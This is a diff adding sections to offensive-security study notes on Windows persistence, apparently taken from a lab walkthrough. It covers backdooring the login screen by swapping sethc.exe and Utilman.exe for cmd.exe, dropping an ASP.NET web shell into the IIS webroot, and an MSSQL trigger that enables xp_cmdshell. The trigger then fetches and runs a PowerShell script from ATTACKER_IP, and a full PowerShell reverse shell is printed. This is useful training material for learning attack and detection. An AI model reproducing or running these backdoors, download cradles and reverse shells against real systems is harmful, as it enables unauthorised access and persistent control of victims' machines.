@@ -126,7 +126,11 @@ Local Windows
       - [Winlogon](#Winlogon)
       - [Logon scripts](#Logon-scripts)
   - [Backdooring the Login Screen RDP](#Backdooring-the-Login-Screen-RDP)
+    - [Sticky Keys](#Sticky-Keys)
+    - [Utilman](#Utilman)
   - [Persisting Through Existing Services](#Persisting-Through-Existing-Services)
+    - [Using Web Shells](#Using-Web-Shells)
+    - [Using MSSQL as a Backdoor](#Using-MSSQL-as-a-Backdoor)
   
   
   ------------------------------------------------------------------------------------------------
@@ -2346,6 +2350,145 @@ To create an environment variable for a user, you can go to its HKCU\Environment
 Notice that this registry key has no equivalent in HKLM, making your backdoor apply to the current user only.
 
 After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
+
+
+### Backdooring the Login Screen and RDP
+If we have physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.
+
+We will look at two methods that rely on accessibility features to this end.
+
+### Sticky Keys
+
+When pressing key combinations like CTRL + ALT + DEL, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release CTRL, press and release ALT and finally, press and release DEL to achieve the same effect as pressing the CTRL + ALT + DEL combination.
+
+To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing SHIFT 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:
+![image](https://user-images.githubusercontent.com/24814781/188505118-bf3af81d-92dd-4614-aa93-710899042e82.png)
+
+After pressing SHIFT 5 times, Windows will execute the binary in C:\Windows\System32\sethc.exe. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.
+
+A straightforward way to backdoor the login screen consists of replacing sethc.exe with a copy of cmd.exe. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.
+
+To overwrite sethc.exe, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of cmd.exe. We can do so with the following commands:
+![image](https://user-images.githubusercontent.com/24814781/188505149-519cc2ad-52d5-4415-bc06-fe5c2c6ba3fe.png)
+
+After doing so, lock your session from the start menu:
+![image](https://user-images.githubusercontent.com/24814781/188505163-41b580ee-7cbc-4cca-8054-d47a2305b1c0.png)
+
+You should now be able to press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen:
+![image](https://user-images.githubusercontent.com/24814781/188505212-4013d470-38c8-4bea-bbb8-4b63d2260fbc.png)
+
+### Utilman
+
+Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:
+![image](https://user-images.githubusercontent.com/24814781/188505303-782d7bd0-e406-4171-8659-8719bddb7d71.png)
+
+When we click the ease of access button on the login screen, it executes C:\Windows\System32\Utilman.exe with SYSTEM privileges. If we replace it with a copy of cmd.exe, we can bypass the login screen again.
+
+To replace utilman.exe, we do a similar process to what we did with sethc.exe:
+![image](https://user-images.githubusercontent.com/24814781/188505323-13989ec6-9e8a-4b54-b8c4-b9ac71ca65b6.png)
+
+To trigger our terminal, we will lock our screen from the start button:
+![image](https://user-images.githubusercontent.com/24814781/188505338-f065d3e1-fd21-4a83-bc74-20cbc47f10c4.png)
+
+And finally, proceed to click on the "Ease of Access" button. Since we replaced utilman.exe with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:
+![image](https://user-images.githubusercontent.com/24814781/188505352-f18a0811-442a-4e7b-a99f-dec0cb87655d.png)
+
+### Persisting Through Existing Services
+If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!
+
+### Using Web Shells
+
+The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is iis apppool\defaultapppool. Even if this is an unprivileged user, it has the special SeImpersonatePrivilege, providing an easy way to escalate to the Administrator using various known exploits. 
+
+Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided here,
+```
+https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx
+```
+but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the C:\inetpub\wwwroot directory:
+![image](https://user-images.githubusercontent.com/24814781/188505972-18337cbb-6daa-49db-a09e-76045afe4b55.png)
+
+We can then run commands from the web server by pointing to the following URL:
+
+http://10.10.234.126/shell.aspx
+
+![image](https://user-images.githubusercontent.com/24814781/188505980-52ddb308-933f-48ba-b8d3-6e965ca8d032.png)
+
+While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.
+
+
+### Using MSSQL as a Backdoor
+
+There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into the HRDB database.
+
+Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the xp_cmdshell stored procedure. xp_cmdshell is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.
+
+To enable it, let's open Microsoft SQL Server Management Studio 18, available from the start menu. When asked for authentication, just use Windows Authentication (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.
+
+Once logged in, click on the New Query button to open the query editor:
+![image](https://user-images.githubusercontent.com/24814781/188506022-c51c73cc-6288-4bf7-bc9b-20bf9fb15ad1.png)
+
+Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable xp_cmdshell.
+
+```
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+```
+After this, we must ensure that any website accessing the database can run xp_cmdshell. By default, only database users with the sysadmin role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the sa user, which is the default database administrator:
+```
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+```
+
+After all of this, we finally configure a trigger. We start by changing to the HRDB database:
+```
+USE HRDB
+```
+
+Our trigger will leverage xp_cmdshell to execute Powershell to download and run a .ps1 file from a web server controlled by the attacker. The trigger will be configured to execute whenever an INSERT is made into the Employees table of the HRDB database:
+
+```
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+```
+
+
+Now that the backdoor is set up, let's create evilscript.ps1 in our attacker's machine, which will contain a Powershell reverse shell:
+
+```
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
+```
+
+We will need to open two terminals to handle the connections involved in this exploit:
+
+*    The trigger will perform the first connection to download and execute evilscript.ps1. Our trigger is using port 8000 for that.
+*    The second connection will be a reverse shell on port 4454 back to our attacker machine.
+
+![image](https://user-images.githubusercontent.com/24814781/188506147-d265ae97-f1df-403e-83e3-1004e10f73b2.png)
+
+With all that ready, let's navigate to http://10.10.234.126/ and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.
 
 ----------------------------------------------------------------------------------------------------------------------------------
 ## Privilege Escalation Techniques
